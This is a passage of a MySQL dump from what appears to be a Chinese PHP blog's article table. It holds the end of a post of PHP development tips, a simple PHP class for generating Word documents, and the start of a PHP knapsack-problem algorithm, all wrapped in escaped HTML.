style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　最后，变得偏执一点吧。除非你认为你的站点永远不会受到攻击，否则就正视所有的问题，当问题真正发生的时候，你的情况会变得很糟。你需要把每个用户都看成会带来一场攻防站的黑客，想尽一切办法来保护站点的安全，同时想好相应问题的解决方案。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　&lt;b style=&quot;outline-style:none;outline-width:initial;outline-color:initial;font-weight:700;&quot;&gt;　4. 多使用PHP缓存 – Ben Balbo&lt;/b&gt;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　Ben Balbo开发了Site Point，一个为developers和designers提供指导的网站。他是墨尔本PHP开发和开源俱乐部的成员， 因此他对PHP有一定的了解，同时对PHP caching有一定的想法和经验。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　如果你拥有一个访问量很大，但更新并不频繁的站点(比如blog，基于某种CMS)，或许它需要进行一些改造，这些改造不会花费太多的时间，但是对性能有突出的贡献。 如果要为一个复杂/更新频率很快的站点建立缓存机制，过程可能会很曲折，但是好处也是显而易见的。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　PHP缓存技术有很多种，Ben为我们推荐了如下一些:&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　◆缓存函数的运行结果&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　◆设置过期时间&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　◆缓存IE下载的文件&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　◆模板缓存技术&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　◆Cache_Lite&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　由于PHP作为动态语言的特性，缓存机制对于更新频率并不快的站点来说非常重要。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　&lt;b style=&quot;outline-style:none;outline-width:initial;outline-color:initial;font-weight:700;&quot;&gt;5. 使用IDE, Templates和Snippets加速PHP开发 – Chad Kieffer&lt;/b&gt;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　当Chad Kieffer从UI设计和数据库优化的工作中抽身出来的时候，他会在他的博客2 tablespoons上分享很多技术经验。由于Chad多方面的全面发展，他经常可以发现其他&lt;span id=&quot;rlt_6&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;cursor:pointer;border-bottom-width:1px;border-bottom-style:solid;border-bottom-color:#fa891b;&quot;&gt;程序员&lt;/span&gt;不能发现的问题，并形成相关经验，尤其是他开发网站的方法。他参与了网站开发的各个环节，因此他的建议对于提高网站开发的大局观非常有用。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　Chad认为使用Eclipse PDT(Eclipse’s PHP development package) 这样的IDE，同时使用一些模板技术和开源项目可以有效地提高PHP的开发速度。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　紧凑的计划，长长的to do lists以及deadlines让开发人员非常苦闷。不过有些功能，比如Eclipse Templates，可以有效减少编码的时间和出错的几率。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　通常来说，任何项目都可以自动化，自动化程度越高， 你完成项目的时间就越短。花时间来开发使用频率很高的框架和模板，将会节省你以后更多时间。同时，使用像Eclipse and the PDT package这样的IDE，你会发现效率得到明显提高，IDE可以自动闭合，补全分号并且可以在本地debug。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　&lt;b style=&quot;outline-style:none;outline-width:initial;outline-color:initial;font-weight:700;&quot;&gt;　6. 利用好PHP的过滤函数 – Joey Sochacki&lt;/b&gt;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　或许Joey Sochacki并不像Matt Mullenweg那样有名 ，但他也是一个经验丰富的开发者，并且通过他的博客Devolio分享了很多技术经验&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　Joey发现在编写php代码的过程中有很多地方需要进行过滤，但却并没有太多的coder关注php的内置过滤函数。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　过滤数据是我们经常需要做的事情，但是很多功能丰富的PHP内置过滤函数却不为人知。使用类似filter_* 的PHP内置函数，我们几乎可以处理所有的过滤任务，包括数据类型验证/URL/email和IP地址验证/特殊字符处理等等。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　过滤是一件复杂的事情，但是我相信joey的发现会给你很多启发，让你认识到PHP强大的过滤功能。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　&lt;b style=&quot;outline-style:none;outline-width:initial;outline-color:initial;font-weight:700;&quot;&gt;7. 使用PHP框架 – Josh Sharp&lt;/b&gt;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　对于是否应该使用Zend, CakePHP, Code Igniter, 或者 其他PHP框架，一直存在着很多争议，但是在web开发者的心中，他们有自己衡量的标准。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　Josh Sharp自己创建了一家提供面包和黄油服务的网站，因此他对于使用PHP框架来开发网站有一定的经验。他认为使用一个PHP框架来进行项目开发(use a PHP framework )，可以有效地节省时间，并且减少出错的几率。为什么?因为他觉得PHP实在是太好上手了。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　PHP的易于使用有时候也有缺陷，因为并不严格的语法，经常会导致很多错误代码的诞生。但如果使用一个PHP框架，出错的几率就会大大减少。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　PHP框架可以让你的代码结构更加规范，并且节省大量时间。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　&lt;b style=&quot;outline-style:none;outline-width:initial;outline-color:initial;font-weight:700;&quot;&gt;8. 不要使用PHP框架 – Rasmus Lerdorf&lt;/b&gt;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　与Josh的观点恰恰相反，PHP的鼻祖Rasmus Lerdorf却认为最好不要使用PHP框架，为什么?因为不基于框架的PHP性能更好。Rasmus在Drupalcon 2008的演讲上，用“Hello World”的例子来对比了一些框架PHP和简单PHP之间的性能，结果显示框架PHP的性能要远远落后。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　&lt;b style=&quot;outline-style:none;outline-width:initial;outline-color:initial;font-weight:700;&quot;&gt;9. 使用批处理 – Jack D. Herrington&lt;/b&gt;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　Jack Herrington对PHP世界并不陌生， 并且为大名鼎鼎的IBM developerWorks贡献过超过30篇的专搞， 同时出版过《PHP Hacks》的书，因此他是一个真正的专家。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　Herrington推荐使用批处理和Cron来代替那些可以运行在后台的程序脚步，Web用户并不愿意在线等待你的处理过程，所以有些事情更适合放到后台来处理。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　诚然，在某些情况下，这有点大材小用了，但是你可以清楚地看到，使用Cron, MySQL, PHP面向对象的方法以及Pear::DB这些便捷的工具来创建一个批处理工具并不是一件复杂的事情。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　Jack认为使用cron, PHP和MySQL在后台处理一些任务，比起多进程的业务逻辑要划算得多。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　两种方法我都尝试过，我认为Cron非常符合”Keep It Simple, Stupid” (KISS) 的原则，它让后台处理变得简单。与多进程的业务逻辑相比，它没有内存 溢出的风险。你可以创建一个简单的批处理脚本，并且在cron中运行，这个脚本会定时检查是否有任务需要处理，处理完之后就会自动退出，因此你不用担心是否有进程卡壳，或者陷入死循环。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　&lt;b style=&quot;outline-style:none;outline-width:initial;outline-color:initial;font-weight:700;&quot;&gt;　10. 及时启用错误报告 – David Cummings&lt;/b&gt;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　David Cummings有一个专门提供CMS软件服务的公司 ，并且获得过几次奖 ，他有非常丰富的PHP开发经验。David曾经写过《two PHP tips he wished he’d learned in the beginning》，其中一点就是：及时启用错误报告，这会节省大量的时间。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　我告诉人们，最重要的事情就是最大程度地开启PHP的错误报告，为什么?因为PHP可能会隐藏很多小问题：&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　◆变量没有预定义&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　◆在代码片段中引用了不可用的变量&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　◆使用了未定义的常量这些因素看起来并不是什么大事，除非你在使用&lt;span id=&quot;rlt_7&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;cursor:pointer;border-bottom-width:1px;border-bottom-style:solid;border-bottom-color:#fa891b;&quot;&gt;面向对象&lt;/span&gt;的方法编写一些类库。通常，关闭错误报告将可能使你付出更大的成本来维护你的代码。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　错误报告可以帮你轻易地找到代码的问题所在，如果错误报告的等级够高，细微的错误都能被立即发现，帮助你节省整体debug的时间。&lt;/span&gt;', 1, 1, 0, 0, 1302531125, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(46, 1, 'php生成word文档类', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse:collapse;color:#333333;font-family:arial;font-size:14px;line-height:21px;&quot;&gt;&lt;ol type=&quot;1&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:25px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;list-style-type:decimal;list-style-position:initial;list-style-image:initial;&quot;&gt;&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;写的很简单，方便初学者&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;lt;?php&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;class word&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;{&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&lt;span id=&quot;rlt_1&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;cursor:pointer;border-bottom-width:1px;border-bottom-style:solid;border-bottom-color:#fa891b;&quot;&gt;function&lt;/span&gt;&amp;nbsp;start()&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;{&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;ob_start();&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;print''&amp;lt;html xmlns:o=&quot;urn:schemas-microsoft-com:office:office&quot;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;xmlns:w=&quot;urn:schemas-microsoft-com:office:word&quot;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;xmlns=&quot;http://www.w3.org/TR/REC-html40&quot;&amp;gt;'';&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;}&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;function save($path)&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;{&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;print &quot;&amp;lt;/html&amp;gt;&quot;;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;$data = ob_get_contents();&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;ob_end_clean();&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;$this-&amp;gt;wirtefile ($path,$data);&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;}&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;function wirtefile ($fn,$data)&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;{&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;$fp=fopen($fn,&quot;wb&quot;);&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;fwrite($fp,$data);&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;fclose($fp);&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;}&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;}&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/li&gt;\r\n&lt;li style=&quot;outline-style:none;outline-width:initial;outline-color:initial;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;?&amp;gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1302531425, 1, 'admin'),
(47, 1, '背包问题的PHP算法-php算法介绍', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse:collapse;color:#333333;font-family:arial;font-size:14px;line-height:21px;&quot;&gt;&amp;lt;?php&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n// http://tieba.baidu.com/f?kz=283979751&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n/*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n设有n 种物品，每种物品有一个重量及一个价值。但每种物品的数量是无限的，同时有一个背包，最大载重量为M，今从n 种物品中选取若干件(同一种物品可以多次选取)，使其重量的和小于等于M，而价值的和为最大。&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nInput&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n第一行：两个整数，M(背包容量，M&amp;lt;= 200)和N(物品数量，N&amp;lt;= 30)； 第2..N+1 行：每行二个整数Wi,Ui，表示每个物品的重量和价值。&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nOutput&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n仅一行，一个数，表示最大总价值。&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nSample Input&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n12 4&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n2 1&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n3 3&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n4 5&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n7 9&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nSample Output&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n15&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nset_time_limit(30);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\ndefine(’NOWTIME’,time());&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nfunction microtime_float()&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n{&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nlist($usec, $sec) = explode(” “, microtime());&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$sec=$sec-NOWTIME;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nreturn ((float)$usec + (float)$sec);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//初始化数组&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n/*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$bbw=12;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$arywp=array();&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$arywp[]=array(’d'',2,1);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$arywp[]=array(’c'',3,3);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$arywp[]=array(’b'',4,5);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$arywp[]=array(’a'',7,9);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$time_start = microtime_float();&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//开始计算&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$wpnum=count($arywp);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$wpnum=20; //允许的物品类型数量&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$bbw=rand(5*$wpnum,50*$wpnum); //背包允许最大重量&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nfor($i1=0;$i1&amp;lt;$wpnum;$i1++){ //初始化每个物品类型的重量和价值&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$arywp[$i1][0]=”w”.$i1; //名称&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$arywp[$i1][1]=rand(50,80); //重量&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$arywp[$i1][2]=rand(20,50); //价值&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$arywp[$i1][3]=$arywp[$i1][2]/$arywp[$i1][1];//单位重量的最大价值&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nfunction cmp($a, $b){&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$returnvalue=0;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif ($a[3] == $b[3]) {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$returnvalue= 0;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n} else {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$returnvalue = ($a[3] &amp;gt; $b[3]) ? -1 : 1;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nreturn $returnvalue;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//按单位最大价值排序&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nusort($arywp, “cmp”);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nprint_r($arywp);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\necho ” &amp;lt;br /&amp;gt;\\n”;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//递归函数，计算剩余空间的允许物品最大价值&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nfunction getmaxval($bbw,$arywp){&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//最大单位物品的重量、价值、数量&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$use_w=0;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$use_v=0;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$ary_userwp=array();&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//当前空间的允许物品最大价值&amp;nbsp;&lt;br 